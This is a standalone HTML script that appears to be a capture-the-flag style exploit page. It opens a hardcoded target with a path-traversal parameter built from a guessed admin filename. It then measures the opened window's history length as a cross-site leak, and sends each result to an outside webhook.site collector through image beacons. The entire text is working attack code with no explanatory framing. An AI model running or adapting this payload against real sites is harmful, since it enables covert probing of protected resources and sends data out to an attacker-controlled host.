<script>
const q = new URLSearchParams(location.search);
const host = q.get('host') || 'https://3.38.205.243';
const guess = q.get('g') || 'zzzz';
const target = host + '/memo/shared?key=' + encodeURIComponent('../../../image/admin?filename=' + guess);
function beacon(kind, extra='') {
  new Image().src = 'https://webhook.site/09513229-f9de-4438-a2b6-12b86e5b4ca2/' + kind + '?g=' + encodeURIComponent(guess) + '&host=' + encodeURIComponent(host) + '&extra=' + encodeURIComponent(extra) + '&t=' + Date.now();
}
let w;
try {
  w = window.open(target, '_blank');
  beacon('opened', String(!!w));
} catch (e) {
  beacon('openerr', e && e.message ? e.message : 'err');
}
setTimeout(() => {
  try {
    const len = w ? w.history.length : -1;
    beacon('hlen', String(len));
  } catch (e) {
    beacon('herr', e && e.message ? e.message : 'err');
  }
}, 8000);
</script>
